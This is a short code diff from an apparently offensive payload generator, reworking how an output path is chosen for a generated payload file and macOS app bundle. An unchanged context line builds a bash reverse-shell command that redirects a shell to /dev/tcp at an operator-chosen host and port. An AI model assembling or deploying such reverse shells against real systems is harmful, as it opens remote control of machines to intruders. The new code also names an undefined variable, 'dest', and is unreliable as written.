@@ -39,24 +39,25 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
-		if path[0] != '/':
-        	    path = os.getcwd()+'/'+path
-    		else:
-        	    path = path
-		direct = os.path.split(path)[0]
-		if os.path.exists(direct):
-		    if os.path.isdir(direct):
-		        if os.path.isdir(path):
-			    h.info_error("Error: "+path+": is a directory!")
-			    exit
-			else:
-		            payload_save_path = path
+		if os.path.isdir(path):
+		    if os.path.exists(path):
+			if path[-1:] == "/":
+                             payload_save_path = path + "payload.ino"
+                        else:
+                             payload_save_path = path + "/payload.ino"
 		    else:
-			h.info_error("Error: "+direct+": not a directory!")
-			exit
+			h.info_error("Local directory: "+dest+": does not exist!")
 		else:
-		    h.info_error("Local directory: "+direct+": does not exist!")
-		    exit
+		    direct = os.path.split(path)[0]
+		    if os.path.exists(direct):
+		        if os.path.isdir(direct):
+		            payload_save_path = path
+		        else:
+			    h.info_error("Error: "+direct+": not a directory!")
+			    exit
+		    else:
+		        h.info_error("Local directory: "+direct+": does not exist!")
+		        exit
 		os.system("cp -r data/app/payload.app "+path+" > /dev/null")
 		os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns > /dev/null")
 		payload = """\
